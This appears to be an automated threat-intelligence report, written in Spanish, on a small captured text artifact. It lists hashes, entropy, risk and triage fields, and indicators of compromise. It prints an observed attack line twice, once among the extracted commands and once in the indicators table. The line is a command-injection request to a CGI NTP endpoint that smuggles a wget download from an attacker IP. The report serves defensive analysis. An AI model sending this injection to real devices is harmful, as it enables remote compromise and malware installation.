# 🧬 Payload Analysis

`635bb05d3a41eb2b3d57a727aa900a62fc54c295cac8bed5a3ea4acbc24dff18`

## 📌 Resumen

Artefacto de 386 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.38. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:17:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `635bb05d3a41eb2b3d57a727aa900a62fc54c295cac8bed5a3ea4acbc24dff18`
- **SHA1:** `2399e53c15290d870678a339e4f87c1da7239c9c`
- **MD5:** `b9dc7daa2ed71ac5945b98c2d488339c`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 386 B |
| Entropía | 5.38 |
| Strings | 6 |

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=2

## 🖥️ Comandos observados / extraídos

```text
POST /cgi-bin/operator/servetest?cmd=ntp&ServerName=%24%28wget%20http%3A%2F%2F31.56.39.XXX%2Fmemory_bin_dir%2Fmemory_load
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| command | POST /cgi-bin/operator/servetest?cmd=ntp&ServerName=%24%28wget%20http%3A%2F%2F31.56.39.XXX%2Fmemory_bin_dir%2Fmemory_load | strings |
| hash | 635bb05d3a41eb2b3d57a727aa900a62fc54c295cac8bed5a3ea4acbc24dff18 | static_analysis |
| ip | 102.204.206.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
